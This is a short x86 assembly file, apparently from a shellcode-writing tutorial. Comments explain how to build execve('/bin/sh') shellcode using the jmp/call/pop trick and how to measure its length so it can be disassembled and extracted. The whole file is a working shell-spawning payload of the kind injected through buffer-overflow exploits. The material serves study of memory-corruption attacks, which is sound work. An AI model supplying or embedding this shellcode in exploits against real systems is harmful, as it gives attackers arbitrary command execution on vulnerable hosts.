	.file	"dummy.c"
	.text
.globl function
	.type	function, @function
function:
	pushl	%ebp
	movl	%esp, %ebp

	# This is where we construct our shellcode. In order to work
	# out the total to be disassembled we use: address of string
	# - address of jmp + string length (32 bytes).

	jmp	jtoc			# Jump down
jtop:
	popl	%esi			# Address of /bin/sh now in %esi

	# Call execve(). We build the array to be passed to execve()
	# on the stack.

	xorl	%eax,%eax		# Zero %eax
#	movb	%al,0x7(%esi)		# NULL terminate /bin/sh
	push	%eax			# NULL after pointer below
	push	%esi			# Create pointer to array
	xorl	%edx, %edx		# NULL in %edx
	movl	%esp,%ecx		# Address of array in %ecx
	movl	%esi,%ebx		# Address of /bin/sh in %ebx
	movb	$0xb,%al		# Set up for execve call in %eax
	int	$0x80			# Jump to kernel mode

jtoc:
	call	jtop
	.string	"/bin/sh"

	popl	%ebp
	ret
	.size	function, .-function
.globl main
	.type	main, @function
main:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$8, %esp
	andl	$-16, %esp
	movl	$0, %eax
	addl	$15, %eax
	addl	$15, %eax
	shrl	$4, %eax
	sall	$4, %eax
	subl	%eax, %esp
	call	function
	movl	$0, %eax
	leave
	ret
	.size	main, .-main
	.section	.note.GNU-stack,"",@progbits
	.ident	"GCC: (GNU) 3.4.6"
